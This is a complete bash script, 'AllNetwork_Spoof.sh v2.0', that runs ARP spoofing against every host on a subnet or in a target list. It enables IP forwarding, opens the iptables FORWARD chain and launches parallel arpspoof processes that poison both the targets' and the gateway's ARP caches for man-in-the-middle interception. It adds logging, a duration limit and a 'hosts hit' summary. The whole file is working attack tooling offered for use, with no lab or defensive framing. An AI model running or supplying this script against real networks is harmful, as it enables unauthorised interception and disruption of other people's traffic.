#!/usr/bin/env bash
# ═══════════════════════════════════════════════════════════════════════════════
# AllNetwork_Spoof.sh v2.0 — Advanced Network-wide ARP Spoof Launcher
#
# New in v2.0:
#   • Target file input   (--targets-file FILE)  — attack specific IPs only
#   • Activity logging    (--log FILE)           — timestamped session log
#   • Gateway validation  before launching       — ping test to gateway
#   • Auto duration limit (--duration SECONDS)   — stop after N seconds
#   • Live status display — active PID count + elapsed time
#   • Session summary     — hosts attacked, duration on exit
#
# Usage:
#   sudo bash AllNetwork_Spoof.sh
#   sudo bash AllNetwork_Spoof.sh -i eth0 -s 192.168.0 -g 192.168.0.1
#   sudo bash AllNetwork_Spoof.sh -i wlan0 -s 10.0.0 --start 1 --end 50
#   sudo bash AllNetwork_Spoof.sh --targets-file targets.txt --log session.log
#   sudo bash AllNetwork_Spoof.sh --duration 300
# ═══════════════════════════════════════════════════════════════════════════════
set -uo pipefail

# ── Defaults ──────────────────────────────────────────────────────────────────
IFACE="ens33"
SUBNET="192.168.1"
GATEWAY=""              # auto-set to ${SUBNET}.1 if not provided
RANGE_START=1
RANGE_END=254
MAX_JOBS=50
DURATION=0              # 0 = run until Ctrl+C
TARGETS_FILE=""         # read specific IPs from a file
LOG_FILE=""             # activity log path
VALIDATE_GW=true        # ping-test the gateway before starting

# ── Colors ────────────────────────────────────────────────────────────────────
RED='\033[0;91m'
GREEN='\033[0;92m'
YELLOW='\033[0;93m'
CYAN='\033[0;96m'
MAGENTA='\033[0;95m'
BOLD='\033[1m'
DIM='\033[2m'
RESET='\033[0m'

# ── State ─────────────────────────────────────────────────────────────────────
CHILD_PIDS=()
ATTACKED_HOSTS=()
SESSION_START=$(date +%s)

# ── Logging helper ────────────────────────────────────────────────────────────
log_msg() {
    local level="$1"
    local msg="$2"
    local ts
    ts=$(date '+%Y-%m-%d %H:%M:%S')
    if [[ -n "$LOG_FILE" ]]; then
        echo "[$ts] [$level] $msg" >> "$LOG_FILE"
    fi
}

# ── Usage ─────────────────────────────────────────────────────────────────────
usage() {
    echo -e "${CYAN}${BOLD}"
    echo "╔══════════════════════════════════════════════════════╗"
    echo "║     Network-wide ARP Spoof Launcher  v2.0           ║"
    echo "╚══════════════════════════════════════════════════════╝"
    echo -e "${RESET}"
    echo "Usage: sudo $0 [OPTIONS]"
    echo ""
    echo "Options:"
    echo "  -i, --interface IFACE      Network interface (default: $IFACE)"
    echo "  -s, --subnet BASE          Subnet base, e.g. 192.168.1 (default: $SUBNET)"
    echo "  -g, --gateway IP           Gateway IP (default: \${SUBNET}.1)"
    echo "      --start N              Range start (default: $RANGE_START)"
    echo "      --end N                Range end   (default: $RANGE_END)"
    echo "  -j, --jobs N               Max concurrent jobs (default: $MAX_JOBS)"
    echo "      --targets-file FILE    Attack specific IPs listed in FILE (one per line)"
    echo "      --log FILE             Write activity log to FILE"
    echo "      --duration SECONDS     Auto-stop after N seconds (default: 0 = unlimited)"
    echo "      --no-validate          Skip gateway ping validation"
    echo "  -h, --help                 Show this help"
    echo ""
    echo "Examples:"
    echo "  sudo $0 -i eth0 -s 10.0.0 -g 10.0.0.1 --start 2 --end 100"
    echo "  sudo $0 --targets-file hosts.txt --log session.log"
    echo "  sudo $0 -i wlan0 --duration 600"
    echo ""
}

# ── Argument parsing ──────────────────────────────────────────────────────────
while [[ $# -gt 0 ]]; do
    case "$1" in
        -i|--interface)    IFACE="$2";          shift 2 ;;
        -s|--subnet)       SUBNET="$2";         shift 2 ;;
        -g|--gateway)      GATEWAY="$2";        shift 2 ;;
        --start)           RANGE_START="$2";    shift 2 ;;
        --end)             RANGE_END="$2";      shift 2 ;;
        -j|--jobs)         MAX_JOBS="$2";       shift 2 ;;
        --targets-file)    TARGETS_FILE="$2";   shift 2 ;;
        --log)             LOG_FILE="$2";       shift 2 ;;
        --duration)        DURATION="$2";       shift 2 ;;
        --no-validate)     VALIDATE_GW=false;   shift   ;;
        -h|--help)         usage; exit 0 ;;
        *)
            echo -e "${RED}[!] Unknown option: $1${RESET}"
            usage
            exit 1
            ;;
    esac
done

# Set gateway default
if [[ -z "$GATEWAY" ]]; then
    GATEWAY="${SUBNET}.1"
fi

# ── Validation ────────────────────────────────────────────────────────────────
if [[ $EUID -ne 0 ]]; then
    echo -e "${RED}[!] This script must be run as root (sudo).${RESET}"
    exit 1
fi

if ! command -v arpspoof &>/dev/null; then
    echo -e "${RED}[!] arpspoof not found. Install: sudo apt install -y dsniff${RESET}"
    exit 1
fi

if ! ip link show "$IFACE" &>/dev/null; then
    echo -e "${RED}[!] Interface '${IFACE}' not found.${RESET}"
    echo -e "${YELLOW}    Available interfaces:${RESET}"
    ip -br link show | awk '{print "      " $1}'
    exit 1
fi

if [[ -z "$TARGETS_FILE" ]]; then
    if [[ $RANGE_START -lt 1 || $RANGE_END -gt 254 || $RANGE_START -gt $RANGE_END ]]; then
        echo -e "${RED}[!] Invalid range: ${RANGE_START}-${RANGE_END} (must be 1-254).${RESET}"
        exit 1
    fi
fi

if [[ -n "$TARGETS_FILE" && ! -f "$TARGETS_FILE" ]]; then
    echo -e "${RED}[!] Targets file not found: ${TARGETS_FILE}${RESET}"
    exit 1
fi

# ── Cleanup function ──────────────────────────────────────────────────────────
cleanup() {
    local elapsed=$(( $(date +%s) - SESSION_START ))
    echo ""
    echo -e "${YELLOW}[*] Stopping all arpspoof processes...${RESET}"
    log_msg "INFO" "Cleanup triggered — stopping ${#CHILD_PIDS[@]} processes"

    for pid in "${CHILD_PIDS[@]}"; do
        kill "$pid" 2>/dev/null || true
    done

    pkill -f "arpspoof -i ${IFACE}" 2>/dev/null || true
    wait 2>/dev/null || true

    echo -e "${GREEN}[+] All processes stopped.${RESET}"
    echo ""
    echo -e "${BOLD}╔══════════════════════════════════════════════╗${RESET}"
    echo -e "${BOLD}║            Session Summary                   ║${RESET}"
    echo -e "${BOLD}╚══════════════════════════════════════════════╝${RESET}"
    echo -e "  Interface  : ${CYAN}${IFACE}${RESET}"
    echo -e "  Gateway    : ${CYAN}${GATEWAY}${RESET}"
    echo -e "  Hosts hit  : ${GREEN}${#ATTACKED_HOSTS[@]}${RESET}"
    printf "  Duration   : %02d:%02d:%02d\n" \
        $((elapsed/3600)) $(( (elapsed%3600)/60 )) $((elapsed%60))
    echo ""
    echo -e "${YELLOW}[*] ARP caches on victims self-heal in ~60s.${RESET}"

    log_msg "INFO" "Session ended — hosts=${#ATTACKED_HOSTS[@]}, duration=${elapsed}s"
    exit 0
}

trap cleanup SIGINT SIGTERM

# ── Banner ────────────────────────────────────────────────────────────────────
echo -e "${CYAN}${BOLD}"
echo "╔══════════════════════════════════════════════════════╗"
echo "║     Network-wide ARP Spoof Launcher  v2.0           ║"
echo "╚══════════════════════════════════════════════════════╝"
echo -e "${RESET}"

# ── Init log ──────────────────────────────────────────────────────────────────
if [[ -n "$LOG_FILE" ]]; then
    {
        echo "================================================================"
        echo "AllNetwork_Spoof v2.0 — Session started $(date '+%Y-%m-%d %H:%M:%S')"
        echo "Interface: $IFACE  |  Gateway: $GATEWAY"
        echo "================================================================"
    } >> "$LOG_FILE"
    echo -e "${GREEN}[+] Logging to: ${LOG_FILE}${RESET}"
fi

# ── Configuration display ─────────────────────────────────────────────────────
echo -e "${YELLOW}[*] Configuration:${RESET}"
echo -e "    Interface    : ${CYAN}${IFACE}${RESET}"
echo -e "    Gateway      : ${CYAN}${GATEWAY}${RESET}"
echo -e "    Max jobs     : ${CYAN}${MAX_JOBS}${RESET}"
if [[ -n "$TARGETS_FILE" ]]; then
    echo -e "    Targets file : ${CYAN}${TARGETS_FILE}${RESET}"
else
    echo -e "    IP range     : ${CYAN}${SUBNET}.${RANGE_START} — ${SUBNET}.${RANGE_END}${RESET}"
fi
if [[ $DURATION -gt 0 ]]; then
    echo -e "    Auto-stop    : ${CYAN}${DURATION}s${RESET}"
fi
echo ""

# ── Gateway validation ────────────────────────────────────────────────────────
if [[ "$VALIDATE_GW" == true ]]; then
    echo -e "${YELLOW}[*] Validating gateway ${GATEWAY}...${RESET}"
    if ping -c 2 -W 2 "$GATEWAY" &>/dev/null; then
        echo -e "${GREEN}[+] Gateway is reachable.${RESET}"
        log_msg "INFO" "Gateway $GATEWAY reachable"
    else
        echo -e "${RED}[!] Gateway ${GATEWAY} did not respond to ping.${RESET}"
        echo -e "${YELLOW}    Continuing anyway (use --no-validate to suppress this check).${RESET}"
        log_msg "WARN" "Gateway $GATEWAY unreachable — continuing"
    fi
    echo ""
fi

# ── Enable IP forwarding ──────────────────────────────────────────────────────
echo -e "${YELLOW}[*] Enabling IP forwarding...${RESET}"
sysctl -w net.ipv4.ip_forward=1 > /dev/null 2>&1
iptables -P FORWARD ACCEPT 2>/dev/null || true
echo -e "${GREEN}[+] IP forwarding enabled.${RESET}"
log_msg "INFO" "IP forwarding enabled"
echo ""

# ── Build target list ─────────────────────────────────────────────────────────
TARGET_IPS=()

if [[ -n "$TARGETS_FILE" ]]; then
    echo -e "${YELLOW}[*] Reading targets from: ${TARGETS_FILE}${RESET}"
    while IFS= read -r line; do
        line="${line%%#*}"         # strip comments
        line="${line// /}"        # strip spaces
        [[ -z "$line" ]] && continue
        [[ "$line" == "$GATEWAY" ]] && continue
        TARGET_IPS+=("$line")
    done < "$TARGETS_FILE"
    echo -e "${GREEN}[+] Loaded ${#TARGET_IPS[@]} target(s) from file.${RESET}"
    log_msg "INFO" "Loaded ${#TARGET_IPS[@]} targets from $TARGETS_FILE"
else
    for i in $(seq "$RANGE_START" "$RANGE_END"); do
        ip="${SUBNET}.${i}"
        [[ "$ip" == "$GATEWAY" ]] && continue
        TARGET_IPS+=("$ip")
    done
fi

TOTAL="${#TARGET_IPS[@]}"
if [[ $TOTAL -eq 0 ]]; then
    echo -e "${RED}[!] No targets to attack.${RESET}"
    exit 1
fi

echo ""
echo -e "${YELLOW}[*] Launching arpspoof for ${TOTAL} target(s)...${RESET}"
echo -e "${DIM}    Press Ctrl+C to stop all processes.${RESET}"
echo ""

# ── Launch arpspoof workers ───────────────────────────────────────────────────
LAUNCHED=0
FAILED=0

for ip in "${TARGET_IPS[@]}"; do
    arpspoof -i "$IFACE" -t "$ip" -r "$GATEWAY" > /dev/null 2>&1 &
    pid=$!

    # Brief wait and check if process survived
    sleep 0.05
    if kill -0 "$pid" 2>/dev/null; then
        CHILD_PIDS+=("$pid")
        ATTACKED_HOSTS+=("$ip")
        LAUNCHED=$((LAUNCHED + 1))
    else
        FAILED=$((FAILED + 1))
    fi

    log_msg "INFO" "arpspoof launched → $ip (pid=$pid)"

    # Progress every 25 hosts
    if (( LAUNCHED % 25 == 0 )); then
        echo -e "    ${DIM}Launched ${LAUNCHED}/${TOTAL}...${RESET}"
    fi

    # Throttle: wait if too many concurrent jobs
    while (( $(jobs -rp | wc -l) >= MAX_JOBS )); do
        sleep 0.1
    done
done

echo ""
echo -e "${GREEN}${BOLD}[+] Attack active: ${LAUNCHED} processes running.${RESET}"
[[ $FAILED -gt 0 ]] && echo -e "${YELLOW}[!] ${FAILED} process(es) failed to start.${RESET}"
echo ""

log_msg "INFO" "Attack launched — $LAUNCHED hosts, $FAILED failures"

# ── Status loop ───────────────────────────────────────────────────────────────
echo -e "${DIM}    Monitoring... Ctrl+C to stop.${RESET}"
TICK=0
while true; do
    sleep 5
    TICK=$((TICK + 5))

    ACTIVE=$(jobs -rp | wc -l)
    ELAPSED=$(( $(date +%s) - SESSION_START ))
    H=$((ELAPSED/3600)); M=$(( (ELAPSED%3600)/60 )); S=$((ELAPSED%60))

    printf "\r${DIM}  [%02d:%02d:%02d] Processes active: ${CYAN}%-4s${RESET}${DIM}  Targets: %d    ${RESET}" \
        "$H" "$M" "$S" "$ACTIVE" "$LAUNCHED"

    # Duration auto-stop
    if [[ $DURATION -gt 0 && $ELAPSED -ge $DURATION ]]; then
        echo ""
        echo -e "\n${YELLOW}[*] Duration limit reached (${DURATION}s). Stopping...${RESET}"
        log_msg "INFO" "Duration limit ${DURATION}s reached"
        cleanup
    fi
done
